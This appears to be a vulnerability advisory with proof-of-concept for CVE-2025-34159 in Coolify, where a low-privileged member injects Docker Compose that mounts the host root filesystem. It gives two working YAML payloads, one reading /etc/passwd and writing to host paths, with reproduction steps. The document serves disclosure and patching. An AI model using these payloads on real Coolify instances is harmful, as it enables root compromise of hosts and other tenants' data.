# CVE-2025-34159: Docker Compose Injection in Coolify

## Vulnerability Overview

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2025-34159 |
| **Affects** | Coolify ≤ v4.0.0-beta.420.6 |
| **Fixed in** | v4.0.0-beta.420.7 |
| **Severity** | Critical |
| **CVSS 4.0** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| **CWE** | CWE-78 (OS Command Injection), CWE-20 (Improper Input Validation) |

---

## Executive Summary

A **critical Remote Code Execution (RCE)** vulnerability exists in Coolify's application deployment workflow. This flaw allows a low-privileged **member** to inject arbitrary **Docker Compose directives** during project creation or updates. By defining a malicious service that mounts the host filesystem, an attacker can achieve **root-level command execution on the host OS**, completely bypassing container isolation.

---

### Security Impact
- **Arbitrary command execution** on the host system with root privileges
- **Complete host compromise** including ability to read/write system files, establish persistence, and perform lateral movement
- **Multi-tenant security breach** potentially compromising other users and teams on the same instance
- **Bypass of security controls** rendering UI terminal access restrictions (403 controls) irrelevant
  
---

## Technical Details

### Affected Versions
- **Vulnerable Versions:** Coolify ≤ v4.0.0-beta.420.6
- **Patched Version:** v4.0.0-beta.420.7

### Attack Vector
The vulnerability exists in the project deployment workflow where user-supplied Docker Compose configurations are processed without sufficient validation or sandboxing.

---

## Proof of Concept

### PoC 1: Host Root Mount with Command Execution

```yaml
version: '3.8'
services:
  poc-host-root:
    image: alpine:3.19
    tty: true
    volumes:
      - /:/host:rw
    command: >
      sh -c "
        echo '[*] Proof of RCE on host' &&
        echo 'RCE by Eyodav' > /host/tmp/proof_rce.txt &&
        whoami &&
        id &&
        uname -a &&
        head -n 5 /host/etc/passwd
      "
```

**Result:** After deployment, `/tmp/proof_rce.txt` appears on the host system, confirming RCE with root privileges.

### PoC 2: Targeted Host Path Write

```yaml
version: '3.8'
services:
  poc-host-write:
    image: alpine:3.19
    tty: true
    volumes:
      - /home/eyodav/PoC:/host
    command: >
      sh -c "
        set -e;
        mkdir -p /host &&
        echo '[*] Writing PoC file to host mount...' &&
        echo RCE_PoC_from_container_$(date) > /host/RCE_PoC.txt &&
        cd /host &&
        pwd &&
        ls -la
      "
```

### Reproduction Steps

1. **Authenticate** as a member-level user (non-administrator)
2. **Create or edit** a project in Coolify
3. **Supply malicious configuration** using one of the Docker Compose payloads above
4. **Deploy** the project
5. **Verify exploitation** by checking for host-side artifacts (e.g., `/tmp/proof_rce.txt`) or reviewing command output in deployment logs

---

### Immediate Actions
1. **Upgrade immediately** to Coolify v4.0.0-beta.420.7 or later
2. **Review existing projects** for potentially malicious Docker Compose configurations
   
---

### References
- **Patch/Release Notes:** [https://github.com/coollabsio/coolify/releases/tag/v4.0.0-beta.420.7](https://github.com/coollabsio/coolify/releases/tag/v4.0.0-beta.420.7)
- **Advisory/PoC Repository:** [https://github.com/Eyodav/CVE-2025-34159](https://github.com/Eyodav/CVE-2025-34159)
